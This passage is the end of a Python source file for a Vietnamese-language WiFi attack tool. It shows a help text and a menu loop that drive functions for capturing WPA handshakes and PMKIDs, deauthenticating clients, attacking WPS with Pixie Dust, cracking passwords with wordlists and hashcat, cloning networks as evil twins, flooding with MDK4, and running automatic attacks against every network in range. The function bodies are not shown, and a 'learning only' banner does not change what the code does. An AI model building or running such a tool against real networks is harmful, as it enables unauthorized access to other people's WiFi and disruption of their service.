║  [08] HASHCAT         - Crack nhanh với GPU                   ║
║  [09] TẠO WORDLIST    - Tạo wordlist thông minh               ║
║  [10] EVIL TWIN       - Tạo AP giả mạo                        ║
║  [11] MDK4            - Tấn công nâng cao                     ║
║  [12] AUTO ATTACK     - Tự động tấn công                      ║
║  [13] STATS           - Xem thống kê                          ║
║  [14] KẾT QUẢ         - Xem mật khẩu đã crack                 ║
║  [15] MONITOR ON      - Bật monitor mode                      ║
║  [16] MONITOR OFF     - Tắt monitor mode                      ║
║  [17] HƯỚNG DẪN       - Xem lại hướng dẫn                    ║
║  [00] THOÁT           - Thoát tool                            ║
║                                                                ║
║  YÊU CẦU:                                                     ║
║  - Chạy với quyền root                                        ║
║  - Card WiFi hỗ trợ monitor mode                              ║
║  - Cài đặt: aircrack-ng, hashcat, reaver, bully, mdk4,...    ║
║                                                                ║
║  LƯU Ý: Tool chỉ dùng cho mục đích học tập!                   ║
╚════════════════════════════════════════════════════════════════╝
{N}"""
    print(help_text)

def main():
    # Hiển thị logo
    show_logo()
    
    # Kiểm tra quyền
    if not check_root():
        print(f"{W}[!] CẢNH BÁO: Cần quyền root để chạy đầy đủ chức năng!{N}")
        time.sleep(2)
    
    # Kiểm tra dependencies
    missing = check_dependencies()
    if missing:
        print(f"{W}[!] Thiếu dependencies:{N}")
        for m in missing:
            print(f"    - {m}")
        print(f"{W}[*] Trên Kali: sudo apt install aircrack-ng hashcat hcxtools reaver bully mdk4 hostapd dnsmasq{N}")
    
    # Xác nhận
    print(f"\n{W}{BOLD}╔════════════════════════════════════════════════════════════════╗{N}")
    print(f"{W}{BOLD}║  Tool này chỉ dùng cho mục đích học tập!                      ║{N}")
    print(f"{W}{BOLD}║  Bạn có đồng ý tiếp tục? (y/n):                                 ║{N}")
    print(f"{W}{BOLD}╚════════════════════════════════════════════════════════════════╝{N}")
    
    choice = input(f"{W}➤ {N}").strip().lower()
    if choice != 'y':
        print(f"{W}[!] Đã thoát.{N}")
        return
    
    # In hướng dẫn
    print_help()
    input(f"{W}[*] Nhấn Enter để tiếp tục...{N}")
    
    # Khởi tạo hacker
    hacker = WiFiHacker()
    
    # Menu loop
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_logo()
        
        # Hiển thị trạng thái
        print(f"{W}{BOLD}─── TRẠNG THÁI ───{N}")
        print(f"Root: {'✓' if check_root() else '✗'}")
        print(f"Monitor: {hacker.monitor_iface or 'Chưa bật'}")
        print(f"Targets: {len(hacker.targets)}")
        print(f"Cracked: {len(hacker.cracked)}")
        print()
        
        # Menu
        print(f"{W}{BOLD}╔════════════════════════════════════════════════════════════════╗{N}")
        print(f"{W}{BOLD}║                         MENU CHÍNH                             ║{N}")
        print(f"{W}{BOLD}╠════════════════════════════════════════════════════════════════╣{N}")
        print(f"{W}║  [01] SCAN MẠNG         [07] CRACK WORDLIST        [13] STATS     ║{N}")
        print(f"{W}║  [02] BẮT HANDSHAKE     [08] HASHCAT               [14] KẾT QUẢ    ║{N}")
        print(f"{W}║  [03] BẮT PMKID         [09] TẠO WORDLIST          [15] MONITOR ON ║{N}")
        print(f"{W}║  [04] DEAUTH ATTACK     [10] EVIL TWIN             [16] MONITOR OFF║{N}")
        print(f"{W}║  [05] WPS ATTACK        [11] MDK4                  [17] HƯỚNG DẪN  ║{N}")
        print(f"{W}║  [06] PIXIE DUST        [12] AUTO ATTACK           [00] THOÁT      ║{N}")
        print(f"{W}{BOLD}╚════════════════════════════════════════════════════════════════╝{N}")
        
        choice = input(f"\n{W}➤ Chọn chức năng [00-17]: {N}").strip()
        
        if choice == '00':
            print(f"{W}[✓] Tạm biệt!{N}")
            hacker.disable_monitor()
            break
        
        elif choice == '01':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                if input(f"{W}Bật ngay? (y/n): {N}").lower() == 'y':
                    if not hacker.interfaces:
                        print(f"{W}[✗] Không tìm thấy interface WiFi!{N}")
                        input("Nhấn Enter...")
                        continue
                    hacker.monitor_iface = hacker.enable_monitor(hacker.interfaces[0])
                    if not hacker.monitor_iface:
                        input("Nhấn Enter...")
                        continue
            
            duration = input(f"{W}Thời gian quét (giây) [15]: {N}").strip()
            duration = int(duration) if duration else 15
            hacker.scan_networks(duration)
            input(f"{W}[*] Nhấn Enter...{N}")
        
        elif choice == '02':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            if not hacker.targets:
                print(f"{W}[!] Chưa có mạng nào. Hãy scan trước!{N}")
                input("Nhấn Enter...")
                continue
            
            print(f"{W}Danh sách mạng:{N}")
            for i, t in enumerate(hacker.targets, 1):
                print(f"{W}[{i}] {t['essid']} ({t['bssid']}) - CH{t['channel']}{N}")
            
            idx = input(f"{W}Chọn số thứ tự: {N}").strip()
            try:
                idx = int(idx) - 1
                target = hacker.targets[idx]
                timeout = input(f"{W}Thời gian bắt [60]: {N}").strip()
                timeout = int(timeout) if timeout else 60
                hacker.capture_handshake(target['bssid'], target['channel'], target['essid'], timeout)
            except:
                print(f"{W}[✗] Chọn sai!{N}")
            input("Nhấn Enter...")
        
        elif choice == '03':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            timeout = input(f"{W}Thời gian bắt [60]: {N}").strip()
            timeout = int(timeout) if timeout else 60
            hacker.capture_pmkid(timeout)
            input("Nhấn Enter...")
        
        elif choice == '04':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            bssid = input(f"{W}BSSID (XX:XX:XX:XX:XX:XX): {N}").strip()
            client = input(f"{W}Client MAC (Enter nếu không): {N}").strip() or None
            count = input(f"{W}Số gói deauth [5]: {N}").strip()
            count = int(count) if count else 5
            channel = input(f"{W}Kênh (Enter nếu không): {N}").strip()
            channel = int(channel) if channel else None
            
            hacker.deauth_attack(bssid, client, count, channel)
            input("Nhấn Enter...")
        
        elif choice == '05':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            bssid = input(f"{W}BSSID: {N}").strip()
            channel = input(f"{W}Kênh: {N}").strip()
            pin = input(f"{W}PIN (nếu có): {N}").strip() or None
            
            result = hacker.wps_attack(bssid, channel, pin)
            if result:
                print(f"{W}[✓] Thành công!{N}")
                if 'pin' in result:
                    print(f"PIN: {result['pin']}")
                if 'password' in result:
                    print(f"Password: {result['password']}")
            else:
                print(f"{W}[✗] Thất bại{N}")
            input("Nhấn Enter...")
        
        elif choice == '06':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            bssid = input(f"{W}BSSID: {N}").strip()
            channel = input(f"{W}Kênh: {N}").strip()
            
            result = hacker.pixie_dust(bssid, channel)
            if result:
                print(f"{W}[✓] Thành công!{N}")
                if 'pin' in result:
                    print(f"PIN: {result['pin']}")
                if 'password' in result:
                    print(f"Password: {result['password']}")
            else:
                print(f"{W}[✗] Thất bại{N}")
            input("Nhấn Enter...")
        
        elif choice == '07':
            hash_file = input(f"{W}File hash (.cap hoặc .22000): {N}").strip()
            wordlist = input(f"{W}Wordlist: {N}").strip()
            
            if not os.path.exists(hash_file):
                print(f"{W}[✗] Không tìm thấy file hash{N}")
                input("Nhấn Enter...")
                continue
            
            mode = 'handshake' if hash_file.endswith('.cap') else 'pmkid'
            hacker.crack_with_wordlist(hash_file, wordlist, mode)
            input("Nhấn Enter...")
        
        elif choice == '08':
            if not shutil.which('hashcat'):
                print(f"{W}[!] hashcat chưa được cài{N}")
                input("Nhấn Enter...")
                continue
            
            hash_file = input(f"{W}File hash (.22000 hoặc .hccapx): {N}").strip()
            wordlist = input(f"{W}Wordlist: {N}").strip()
            
            if not os.path.exists(hash_file):
                print(f"{W}[✗] Không tìm thấy file hash{N}")
                input("Nhấn Enter...")
                continue
            
            hacker.crack_with_hashcat(hash_file, wordlist)
            input("Nhấn Enter...")
        
        elif choice == '09':
            essid = input(f"{W}ESSID: {N}").strip()
            bssid = input(f"{W}BSSID (nếu có): {N}").strip() or None
            output = input(f"{W}File đầu ra [wordlist.txt]: {N}").strip() or 'wordlist.txt'
            
            hacker.generate_wordlist(essid, bssid, output)
            input("Nhấn Enter...")
        
        elif choice == '10':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            essid = input(f"{W}ESSID cần clone: {N}").strip()
            channel = input(f"{W}Kênh: {N}").strip()
            capture = input(f"{W}File capture (nếu có): {N}").strip() or None
            
            hacker.evil_twin(essid, channel, capture)
            input("Nhấn Enter...")
        
        elif choice == '11':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                input("Nhấn Enter...")
                continue
            
            bssid = input(f"{W}BSSID: {N}").strip()
            mode = input(f"{W}Mode (d=deauth, a=beacon, p=probe) [d]: {N}").strip() or 'd'
            
            hacker.mdk4_attack(bssid, mode)
            input("Nhấn Enter...")
        
        elif choice == '12':
            if not hacker.monitor_iface:
                print(f"{W}[!] Chưa bật monitor mode!{N}")
                if input(f"{W}Bật ngay? (y/n): {N}").lower() == 'y':
                    if not hacker.interfaces:
                        print(f"{W}[✗] Không tìm thấy interface WiFi!{N}")
                        input("Nhấn Enter...")
                        continue
                    hacker.monitor_iface = hacker.enable_monitor(hacker.interfaces[0])
                    if not hacker.monitor_iface:
                        input("Nhấn Enter...")
                        continue
            
            bssid = input(f"{W}BSSID mục tiêu (Enter nếu auto tất cả): {N}").strip() or None
            hacker.auto_attack(bssid)
            input("Nhấn Enter...")
        
        elif choice == '13':
            print(f"\n{W}─── THỐNG KÊ ───{N}")
            print(f"Gói tin: {hacker.stats['packets_captured']}")
            print(f"Handshake: {hacker.stats['handshakes']}")
            print(f"PMKID: {hacker.stats['pmkids']}")
            print(f"WPS PIN: {hacker.stats['wps_pins']}")
            print(f"Đã crack: {hacker.stats['cracked']}")
            print(f"Deauth: {hacker.stats['deauthed']}")
            input("Nhấn Enter...")
        
        elif choice == '14':
            hacker.show_results()
            input("Nhấn Enter...")
        
        elif choice == '15':
            if not hacker.interfaces:
                print(f"{W}[✗] Không tìm thấy interface WiFi!{N}")
                input("Nhấn Enter...")
                continue
            
            print(f"{W}Interfaces:{N}")
            for i, iface in enumerate(hacker.interfaces, 1):
                print(f"{W}[{i}] {iface}{N}")
            
            idx = input(f"{W}Chọn số thứ tự: {N}").strip()
            try:
                idx = int(idx) - 1
                hacker.monitor_iface = hacker.enable_monitor(hacker.interfaces[idx])
            except:
                print(f"{W}[✗] Chọn sai!{N}")
            input("Nhấn Enter...")
        
        elif choice == '16':
            hacker.disable_monitor()
            input("Nhấn Enter...")
        
        elif choice == '17':
            print_help()
            input("Nhấn Enter...")
        
        else:
            print(f"{W}[!] Chức năng không hợp lệ!{N}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{W}[!] Thoát tool.{N}")
        sys.exit(0)
    except Exception as e:
        print(f"{W}[!] Lỗi: {e}{N}")
        sys.exit(1)